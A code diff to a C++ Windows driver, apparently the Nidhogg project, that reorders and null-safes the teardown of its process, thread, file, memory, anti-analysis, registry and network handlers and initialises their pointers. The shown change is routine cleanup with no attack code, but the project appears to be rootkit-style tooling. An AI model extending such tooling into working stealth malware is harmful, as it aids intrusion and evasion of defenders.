@@ -234,21 +234,35 @@ void ExecuteInitialOperations() {
 * There is no return value.
 */
 void ClearAll() {
-	if (NidhoggProcessHandler)
-		delete NidhoggProcessHandler;
-
-	if (NidhoggThreadHandler)
-		delete NidhoggThreadHandler;
-	if (NidhoggFileHandler)
-		delete NidhoggFileHandler;
-	if (NidhoggMemoryHandler)
-		delete NidhoggMemoryHandler;
-	if (NidhoggAntiAnalysisHandler)
-		delete NidhoggAntiAnalysisHandler;
-	if (NidhoggRegistryHandler)
-		delete NidhoggRegistryHandler;
-	if (NidhoggNetworkHandler)
+	// Clear the handlers in reverse order of initialization to avoid dependency issues
+	if (NidhoggNetworkHandler) {
 		delete NidhoggNetworkHandler;
+		NidhoggNetworkHandler = nullptr;
+	}
+	if (NidhoggRegistryHandler) {
+		delete NidhoggRegistryHandler;
+		NidhoggRegistryHandler = nullptr;
+	}
+	if (NidhoggAntiAnalysisHandler) {
+		delete NidhoggAntiAnalysisHandler;
+		NidhoggAntiAnalysisHandler = nullptr;
+	}
+	if (NidhoggMemoryHandler) {
+		delete NidhoggMemoryHandler;
+		NidhoggMemoryHandler = nullptr;
+	}
+	if (NidhoggFileHandler) {
+		delete NidhoggFileHandler;
+		NidhoggFileHandler = nullptr;
+	}
+	if (NidhoggThreadHandler) {
+		delete NidhoggThreadHandler;
+		NidhoggThreadHandler = nullptr;
+	}
+	if (NidhoggProcessHandler) {
+		delete NidhoggProcessHandler;
+		NidhoggProcessHandler = nullptr;
+	}
 }
 
 /*
@@ -262,6 +276,14 @@ void ClearAll() {
 * There is no return value.
 */
 bool InitializeFeatures() {
+	NidhoggProcessHandler = nullptr;
+	NidhoggThreadHandler = nullptr;
+	NidhoggFileHandler = nullptr;
+	NidhoggMemoryHandler = nullptr;
+	NidhoggAntiAnalysisHandler = nullptr;
+	NidhoggRegistryHandler = nullptr;
+	NidhoggNetworkHandler = nullptr;
+	
 	// Get windows version.
 	RTL_OSVERSIONINFOW osVersion = { sizeof(osVersion) };
 	NTSTATUS result = RtlGetVersion(&osVersion);
